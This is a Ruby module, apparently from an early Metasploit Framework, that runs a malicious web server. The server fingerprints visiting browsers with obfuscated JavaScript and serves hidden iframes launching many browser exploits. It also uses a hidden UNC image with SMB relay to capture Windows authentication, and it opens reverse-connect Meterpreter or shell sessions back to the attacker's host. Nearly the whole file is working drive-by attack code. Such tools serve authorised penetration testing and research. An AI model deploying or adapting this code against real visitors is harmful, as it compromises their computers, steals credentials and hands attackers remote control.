##
# $Id:$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'rex/exploitation/javascriptosdetect.rb'

module Msf

class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary

	include Exploit::Remote::HttpServer::HTML
	include Auxiliary::Report
	
	def initialize(info = {})
		super(update_info(info, 
			'Name'        => 'HTTP Client Automatic Exploiter',
			'Version'     => '$Revision: $',
			'Description' => %q{
					This module uses a combination of client-side and server-side techniques to
				fingerprint HTTP clients and then automatically exploit them.
				},
			'Author'      => 
				[
					'egypt <egypt[at]metasploit.com>',  # initial concept, integration and extension of Jerome's os_detect.js
					'Jerome Athias'                     # advanced Windows OS detection in javascript
				],
			'License'     => BSD_LICENSE,
			'Actions'     =>
				[
				 	[ 'WebServer' ]
				],
			'PassiveActions' => 
				[
					'WebServer'
				],
			'DefaultAction'  => 'WebServer'))

		register_options([
			OptAddress.new('LHOST', [true, 'The IP address to use for reverse-connect payloads']),
			OptPort.new('LPORT', [false, 'The starting TCP port number for reverse-connect payloads', 4444])
		], self.class)

		@exploits = Hash.new
	end
	
	def init_exploit(name, targ = 0)
		targ ||= 0
		case name
		when %r{exploit/windows}
			payload='windows/meterpreter/reverse_tcp'
		else
			payload='generic/shell_reverse_tcp'
		end	
		@exploits[name] = framework.modules.create(name)
		@exploits[name].datastore['SRVPORT'] = datastore['SRVPORT']

		# For testing, set the exploit uri to the name of the exploit so it's
		# easy to tell what is happening from the browser.
		# XXX: Comment this out for release
		@exploits[name].datastore['URIPATH'] = name  

		@exploits[name].datastore['LPORT']   = @lport
		@exploits[name].datastore['LHOST']   = @lhost
		@exploits[name].exploit_simple(
			'LocalInput'     => self.user_input,
			'LocalOutput'    => self.user_output,
			'Target'         => targ,
			'Payload'        => payload,
			'RunAsJob'       => true)

		@lport += 1
	end

	def setup() 
		super
		@lport = datastore['LPORT'] || 4444
		@lhost = datastore['LHOST']
		@lport = @lport.to_i
		print_status("Starting exploit modules on host #{@lhost}...")

		##
		# Start all the exploit modules
		##

		# TODO: add an Automatic target to all of the Firefox exploits

		# Firefox < 1.0.5
		# requires javascript
		init_exploit('exploit/multi/browser/mozilla_compareto')

		# Firefox < 1.5.0.5
		# requires java
		# requires javascript
		init_exploit('exploit/multi/browser/mozilla_navigatorjava')

		# Firefox < 1.5.0.1
		# For now just use the default target of Mac.
		# requires javascript
		init_exploit('exploit/multi/browser/firefox_queryinterface')

		# works on iPhone 
		# does not require javascript
		init_exploit('exploit/osx/armle/safari_libtiff')

		# untested
		#init_exploit('exploit/osx/browser/software_update')
		# untested
		#init_exploit('exploit/windows/browser/ani_loadimage_chunksize')

		# does not require javascript
		init_exploit('exploit/windows/browser/apple_quicktime_rtsp')

		# requires javascript
		init_exploit('exploit/windows/browser/novelliprint_getdriversettings')

		# Works on default IE 6
		# Doesn't work on Windows 2000 SP0 IE 5.0
		# I'm pretty sure keyframe works on everything this works on, but since
		# this doesn't need javascript, try it anyway.
		# does not require javascript
		init_exploit('exploit/windows/browser/ms03_020_ie_objecttype')

		# requires javascript
		init_exploit('exploit/windows/browser/ie_createobject')

		# I'm pretty sure keyframe works on everything this works on and more,
		# so for now leave it out.
		# requires javascript
		#init_exploit('exploit/windows/browser/ms06_055_vml_method')

		# Works on default IE 5 and 6
		# requires javascript 
		# ActiveXObject('DirectAnimation.PathControl')
		# classid D7A7D7C3-D47F-11D0-89D3-00A0C90833E6
		init_exploit('exploit/windows/browser/ms06_067_keyframe')

		# only works on IE with XML Core Services
		# requires javascript
		# classid 88d969c5-f192-11d4-a65f-0040963251e5
		init_exploit('exploit/windows/browser/ms06_071_xml_core')

		# Pops up whatever client is registered for .pls files.  It's pretty
		# obvious to the user when this exploit loads, so leave it out for now.
		# does not require javascript
		#init_exploit('exploit/windows/browser/winamp_playlist_unc')


		#
		# Requires UNC path which only seems to work on IE in my tests
		#
		
		# Launch a smb_relay module on port 139
		smbr_mod = framework.modules.create('exploit/windows/smb/smb_relay')
		smbr_mod.datastore['LHOST']   = @lhost
		smbr_mod.datastore['LPORT']   = (@lport += 1)
		smbr_mod.datastore['SRVPORT'] = 139
		smbr_mod.datastore['AutoRunScript'] = 'migrate'
		smbr_mod.exploit_simple(
			'LocalInput'     => self.user_input,
			'LocalOutput'    => self.user_output,
			'Target'         => 0,
			'Payload'        => 'windows/meterpreter/reverse_tcp',
			'RunAsJob'       => true)

		# Launch a second one with port 445
		smbr_mod = framework.modules.create('exploit/windows/smb/smb_relay')
		smbr_mod.datastore['LHOST']   = @lhost
		smbr_mod.datastore['LPORT']   = (@lport += 1)
		smbr_mod.datastore['SRVPORT'] = 445
		smbr_mod.datastore['AutoRunScript'] = 'migrate'
		smbr_mod.exploit_simple(
			'LocalInput'     => self.user_input,
			'LocalOutput'    => self.user_output,
			'Target'         => 0,
			'Payload'        => 'windows/meterpreter/reverse_tcp',
			'RunAsJob'       => true)
			
		@myhost = datastore['SRVHOST']
		@myport = datastore['SRVPORT']

	end

	def on_request_uri(cli, request) 
		print_status("Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")

		# Create a cached mapping between IP and detected target
		@targetcache ||= {}
		@targetcache[cli.peerhost] ||= {}
		@targetcache[cli.peerhost][:update] = Time.now.to_i

		##
		# Clean the cache -- remove hosts that we haven't seen for more than 60
		# seconds
		##
		rmq = []
		@targetcache.each_key do |addr|
			if (Time.now.to_i > @targetcache[addr][:update]+60)
				rmq.push addr
			end
		end
		rmq.each {|addr| @targetcache.delete(addr) }
		#--
	
		case request.uri
			when %r{^#{datastore['URIPATH']}.*sessid=}: 
				record_detection(cli, request)
				send_not_found(cli)
			when self.get_resource: 
				#
				# This is the request for exploits.  At this point all we know
				# about the target came from the useragent string which could
				# have been spoofed, so let the javascript figure out which 
				# exploits to run.  Record detection based on the useragent in  
				# case javascript is disabled on the target.
				#

				record_detection(cli, request)
				print_status("Responding with exploits")

				response = build_sploit_response(cli, request)
				response['Expires'] = '0'
				response['Cache-Control'] = 'must-revalidate'
				
				cli.send_response(response)
			else
				print_error("I don't know how to handle this request (#{request.uri}), sending 404")
				send_not_found(cli)
				return false
		end
	end

	def run
		exploit()
	end

	def build_sploit_response(cli, request)
		if (!@targetcache[cli.peerhost]) 
			record_detection(cli, request)
		end
			
		response = create_response()

		# TODO: instead of writing all of the iframes at once,
		# consider having a javascript timeout function that writes
		# each exploit's iframe so they don't step on each other.
		# I'm not sure this is really an issue since IE seems to
		# just load the next iframe when the first didn't crash it.

		objects = { 
			'DirectAnimation.PathControl'            => @exploits['exploit/windows/browser/ms06_067_keyframe'].get_resource, 
			'{88d969c5-f192-11d4-a65f-0040963251e5}' => @exploits['exploit/windows/browser/ms06_071_xml_core'].get_resource,
			'{36723F97-7AA0-11D4-8919-FF2D71D0D32C}' => @exploits['exploit/windows/browser/novelliprint_getdriversettings'].get_resource,
			'{BD96C556-65A3-11D0-983A-00C04FC29E36}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource, 
			'{BD96C556-65A3-11D0-983A-00C04FC29E30}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource,
			'{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource,
			'{6414512B-B978-451D-A0D8-FCFDF33E833C}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource, 
			'{06723E09-F4C2-43c8-8358-09FCD1DB0766}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource, 
			'{639F725F-1B2D-4831-A9FD-874847682010}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource, 
			'{BA018599-1DB3-44f9-83B4-461454C84BF8}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource, 
			'{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource, 
			'{E8CCCDDF-CA28-496b-B050-6C07C962476B}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource, 
			'{AB9BCEDD-EC7E-47E1-9322-D4A210617116}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource, 
			'{0006F033-0000-0000-C000-000000000046}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource,
			'{0006F03A-0000-0000-C000-000000000046}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource,
		}
		hash_declaration = objects.map{ |k, v| "'#{k}', '#{v}'," }.join.chop

		js = <<-ENDJS

			#{js_os_detect}
			#{js_base64}

			// Hash implementation stolen from http://www.mojavelinux.com/articles/javascript_hashes.html
			function Hash() {
				this.length = 0;
				this.items = new Array();
				for (var current_item = 0; current_item < arguments.length; current_item += 2) {
					if (typeof(arguments[current_item + 1]) != 'undefined') {
						this.items[arguments[current_item]] = arguments[current_item + 1];
						this.length++;
					}
				}
			}

			function send_detection_report(detected_version) {
				// ten chars long and all uppercase so we can't possibly step
				// on a real version string.
				var cruft = "#{Rex::Text.rand_text_alpha_upper(10)}"; 
				var encoded_detection;
				try { xmlhr = new XMLHttpRequest(); }
				catch(e) {
					try { xmlhr = new ActiveXObject("Microsoft.XMLHTTP"); }
					catch(e) {
						xmlhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
					}
				}
				if (! xmlhr) {
					return(0);
				}
				encoded_detection =  new String();
				encoded_detection += detected_version.os_name + cruft; 
				encoded_detection += detected_version.os_flavor + cruft; 
				encoded_detection += detected_version.os_sp + cruft; 
				encoded_detection += detected_version.os_lang + cruft; 
				encoded_detection += detected_version.arch + cruft; 
				encoded_detection += detected_version.browser_name + cruft; 
				encoded_detection += detected_version.browser_version; 
				while (-1 != encoded_detection.indexOf(cruft)) {
					encoded_detection = encoded_detection.replace(cruft, ":");
				}
				document.write(encoded_detection + "<br>");
				encoded_detection = Base64.encode(encoded_detection);
				document.write(encoded_detection + "<br>");
				xmlhr.open("GET", document.location + "?sessid=" + encoded_detection, false);
				xmlhr.send(null);
			}

			function BodyOnLoad() {
				var sploit_frame = '';
				var body_elem = document.getElementById('body_id');
				var detected_version = getVersion();

				try {
					// This function doesn't seem to get created on old
					// browsers (specifically, Firefox 1.0), so until I
					// can puzzle out why, wrap it in a try block so the
					// javascript parser doesn't crap out and die before
					// any exploits get sent.
					send_detection_report(detected_version);
				} catch (e) {}

				if ("#{HttpClients::IE}" == detected_version.browser_name) {
					//document.write("This is IE<br />");
					// object_list contains key-value pairs like 
					//        {classid} => /srvpath/to/exploit/for/classid
					//   and
					//        ActiveXname => /srvpath/to/exploit/for/ActiveXname
					var object_list = new Hash(#{hash_declaration});
					var vuln_obj;
					var written_frames = new Array();

					// iterate through our list of exploits 
					//document.write("I have " + object_list.length + " objects to test <br />");
					for (var current_item in object_list.items) {
						//document.write("Testing for object " + current_item + " ... ");
						// Don't write the same iframe more than once.  This is
						// only an issue with ie_createobject which uses a ton of
						// different classids to perform the same exploit.
						// Assumes that no url will be a substring of another url.
						if (-1 != written_frames.toString().indexOf(object_list.items[current_item])) {
							//document.write("Already wrote an iframe for " + object_list.items[current_item] +"<br>");
							continue;
						}
						vuln_obj = ''; 
						if (current_item.substring(0,1) == '{') {
							//document.write("which is a clasid <br />");

							// classids are stored surrounded in braces for an easy way to tell 
							// them from ActiveX object names, so if it has braces, strip them 
							// out and create an object element with that classid
							var vuln_obj = document.createElement("object");

							vuln_obj.setAttribute("classid", "clsid:" + current_item.substring( 1, current_item.length - 1 ) ) ;
						} else {
							//document.write("which is an AXO name <br />");

							// otherwise, try to create an AXO with that name
							try { vuln_obj = new ActiveXObject(current_item); } catch(e){}
						}
						// This doesn't bloody work.  vuln_obj is always something
						// that evaluates to true but there doesn't seem to be any
						// way of determining if it is actually an ActiveX object.
						// Since we can't tell if it will work, we end up just sending
						// all of the iframes; some of them don't work, some of them
						// do and we get multiple shells.  Junior Varsity.
						if (vuln_obj) {
							document.write("It exists, making evil iframe <br />");
							sploit_frame += '#{build_iframe("' + object_list.items[current_item] + '")}';
							// why the hell is there no array.push() in javascript?
							written_frames[written_frames.length] = object_list.items[current_item];
						} else {
							//document.write("It does NOT exist, skipping. <br />");
						}
					} // for each exploit
				} // if IE
				else {
					//document.write("this is NOT MSIE<br />");
					if (window.navigator.javaEnabled && window.navigator.javaEnabled()) {
						sploit_frame += '#{build_iframe(@exploits['exploit/multi/browser/mozilla_navigatorjava'].get_resource)}';
					}
					if (window.InstallVersion) {
						sploit_frame += '#{build_iframe(@exploits['exploit/multi/browser/mozilla_compareto'].get_resource)}';
					}
					// eventually this exploit will have an auto target and
					// this check won't be necessary
					//if ("#{OperatingSystems::MAC_OSX}" == detected_version.os_name) {
						if (location.QueryInterface) {
							sploit_frame += '#{build_iframe(@exploits['exploit/multi/browser/firefox_queryinterface'].get_resource)}';
						}
					//}
				}
				if (0 < sploit_frame.length) { 
					//document.write("Conditions optimal, writing evil iframe(s) <br />"); 
					document.write(sploit_frame); 
				}
			} // function BodyOnLoad
			window.onload = BodyOnLoad
		ENDJS
		opts = {
			# Strings obfuscation still needs more testing
			'Strings' => true,
			'Symbols' => {
				'Variables' => [
					'current_item', 'items',
					'body_elem', 'body_id', 
					'object_list', 'vuln_obj', 
					'obj_elem', 'sploit_frame',
					'cruft', 'written_frames',
					'detected_version', 'xmlhr',
					'encoded_detection'
				],
				'Methods'   => [
					'Hash', 'BodyOnLoad', 
					'send_detection_report'
				]
			}
		}

		js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)
		js.update_opts(js_os_detect.opts)
		js.update_opts(js_base64.opts)
		js.obfuscate()

		body  = "<body id=#{js.sym('body_id')}>"

		# 
		# These are non-javascript exploits, send them with all requests in
		# case the ua is spoofed and js is turned off
		#
		body << "<!--[if lt IE 7]>"
		# commented this out so i can test other exploits
		# XXX uncomment for release
		#body << build_iframe(@exploits['exploit/windows/browser/ms03_020_ie_objecttype'].get_resource)
		body << "<![endif]-->"

		# image for smb_relay 
		share_name = Rex::Text.rand_text_alpha(rand(10) + 5) 
		img_name = Rex::Text.rand_text_alpha(rand(10) + 5) + ".jpg"
		body << %Q{
			<img src="\\\\#{@lhost}\\#{share_name}\\#{img_name}" style="visibility:hidden" height="0" width="0" border="0" />
		}
		body << build_iframe(@exploits['exploit/windows/browser/apple_quicktime_rtsp'].get_resource)
		body << build_iframe(@exploits['exploit/osx/armle/safari_libtiff'].get_resource)


		response.body = ' <html > <head > <title > Loading </title> '
		response.body << ' <script language="javascript" type="text/javascript" >'
		response.body << " <!--\n" + js + ' //-->'
		response.body << ' </script> </head> ' + body 

		response.body << " </body> </html> "

		return response
	end

	# consider abstracting this out to a method (probably
	# with a different name) of Auxiliary::Report or
	# Exploit::Remote::HttpServer
	def record_detection(cli, request)
		os_name = nil
		os_flavor = nil
		os_sp = nil
		os_lang = nil
		arch = nil
		ua_name = nil
		ua_vers = nil

		data_offset = request.uri.index('sessid=')
		if (data_offset.nil? or -1 == data_offset) 
			print_status("Recording detection from User-Agent")
			# then we didn't get a report back from our javascript
			# detection; make a best guess effort from information 
			# in the user agent string.  The OS detection should be
			# roughly the same as the javascript version because it
			# does most everything with navigator.userAgent

			ua = request['User-Agent']
			# always check for IE last because everybody tries to
			# look like IE
			case (ua)
				when /Version\/(\d+\.\d+\.\d+).*Safari/
					ua_name = HttpClients::SAFARI
					ua_vers  = $1
				when /Firefox\/((:?[0-9]+\.)+[0-9]+)/:
					ua_name = HttpClients::FF
					ua_vers  = $1
				when /Mozilla\/[0-9]\.[0-9] \(compatible; MSIE ([0-9]\.[0-9]+)/:
					ua_name = HttpClients::IE
					ua_vers  = $1
			end
			case (ua)
				when /Windows/:
					os_name = OperatingSystems::WINDOWS
					arch = ARCH_X86
				when /Linux/:
					os_name = OperatingSystems::LINUX
				when /iPhone/
					os_name = OperatingSystems::MAC_OSX
					arch = 'armle'
				when /Mac OS X/
					os_name = OperatingSystems::MAC_OSX
			end
			case (ua)
				when /Windows 95/:
					os_flavor = '95'
				when /Windows 98/:
					os_flavor = '98'
				when /Windows NT 4/:
					os_flavor = 'NT'
				when /Windows NT 5.0/:
					os_flavor = '2000'
				when /Windows NT 5.1/:
					os_flavor = 'XP'
				when /Windows NT 5.2/:
					os_flavor = '2003'
				when /Windows NT 6.0/:
					os_flavor = 'Vista'
				when /Gentoo/:
					os_flavor = 'Gentoo'
				when /Debian/:
					os_flavor = 'Debian'
				when /Ubuntu/:
					os_flavor = 'Ubuntu'
			end
			case (ua)
				when /PPC/
					arch = ARCH_PPC
				when /i.86/
					arch = ARCH_X86
			end

			print_status("Browser claims to be #{ua_name} #{ua_vers}, running on #{os_name} #{os_flavor}")
		else
			print_status("Recording detection from JavaScript")
			data_offset += 'sessid='.length
			detected_version = request.uri[data_offset, request.uri.length]
			if (0 < detected_version.length)
				detected_version = Rex::Text.decode_base64(Rex::Text.uri_decode(detected_version))
				print_status("Report: #{detected_version}")
				(os_name, os_flavor, os_sp, os_lang, arch, ua_name, ua_vers) = detected_version.split(':')
			end
		end
		arch ||= ARCH_X86

		report_host(
			:host       => cli.peerhost,
			:os_name    => os_name,
			:os_flavor  => os_flavor, 
			:os_sp      => os_sp, 
			:os_lang    => os_lang, 
			:arch       => arch,
			:ua_name    => ua_name,
			:ua_vers    => ua_vers
		)
		report_note(
			:host       => cli.peerhost,
			:type       => 'http_request',
			:data       => "#{@myhost}:#{@myport} #{request.method} #{request.resource} #{os_name} #{ua_name} #{ua_vers}"
		)

	end

	def report_host(opts)

		@targetcache[opts[:host]][:os_name]   = opts[:os_name]
		@targetcache[opts[:host]][:os_flavor] = opts[:os_flavor]
		@targetcache[opts[:host]][:os_sp]     = opts[:os_sp]
		@targetcache[opts[:host]][:os_lang]   = opts[:os_lang]
		@targetcache[opts[:host]][:arch]      = opts[:arch]
		@targetcache[opts[:host]][:ua_name]   = opts[:ua_name]
		@targetcache[opts[:host]][:ua_vers]   = opts[:ua_vers]

		super(opts)
	end
	
	# This or something like it should probably be added upstream in Msf::Exploit::Remote
	def get_target_os(cli)
		if framework.db.active
			host = framework.db.get_host(nil, cli.peerhost)
			res = host.os_name
		elsif @targetcache[cli.peerhost] and @targetchace[cli.peerhost][:os_name]
			res = @targetcache[cli.peerhost][:os_name]
		else
			res = OperatingSystems::UNKNOWN
		end
		return res
	end

	# This or something like it should probably be added upstream in Msf::Exploit::Remote
	def get_target_arch(cli)
		if framework.db.active
			host = framework.db.get_host(nil, cli.peerhost)
			res = host.arch
		elsif @targetcache[cli.peerhost][:arch]
			res = @targetcache[cli.peerhost][:arch]
		else
			res = ARCH_X86
		end
		return res
	end

	def build_iframe(resource)
		ret = ''
		ret << "<p>#{resource}</p>"
		ret << "<iframe src=\"#{resource}\" style=\"visibility:hidden\" height=\"0\" width=\"0\" border=\"0\"></iframe>"
		return ret
	end
end
end

